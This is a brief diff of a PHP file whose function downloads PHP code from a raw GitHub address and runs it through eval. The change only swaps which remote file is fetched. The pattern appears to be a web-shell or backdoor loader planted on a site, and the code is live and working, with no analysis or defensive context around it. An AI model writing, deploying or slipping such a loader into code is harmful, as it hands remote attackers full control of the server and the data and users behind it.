@@ -26,5 +26,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw.githubusercontent.com/dandi889/dandi889/main/green.php');
+$a = geturlsinfo('https://raw.githubusercontent.com/dandi889/dandi889/main/gesekdikitgangaruh.php');
 eval    ('?>'.$a);
